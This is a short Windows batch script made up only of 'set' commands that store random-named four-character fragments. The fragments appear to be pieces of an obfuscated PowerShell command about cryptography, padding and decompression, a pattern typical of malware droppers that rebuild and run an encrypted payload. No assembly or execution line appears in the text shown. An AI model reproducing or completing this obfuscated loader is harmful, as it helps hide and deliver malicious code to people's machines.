@echo off
set "TIejNIsDUi=ress"
set "OYqlmOWizv=ress"
set "MZpJMHhluM=PxEW"
set "kpFkhWwtOJ=::('"
set "MGzTTAOSXj=fore"
set "UlmRqmrIif=ewLi"
set "suoFLWQrDr=zHhH"
set "BIkUKsUkAU=.Com"
set "cttNmfKxfu= '')"
set "oRrlRWkiph=hy.A"
set "uoefxEXuwQ=);$O"
set "LaPrCHvobq=XKeK"
set "EDDYtCqUZt=WM ="
set "WbpQshhVfH=e = "
set "mOrIRDGAwH=ApM."
set "fZSACitTaT=pose"
set "rXZSacgKwE=W = "
set "XUKNoIgozq=ach "
set "leMQvVGhHo=ptog"
set "atyTSIcZWK=j = "
set "hKxyloipSi=ck($"
set "WEjunuksFn=ddin"
set "SxUOeoHIdl=s75K"
set "BwafSzfiLP=[-1."
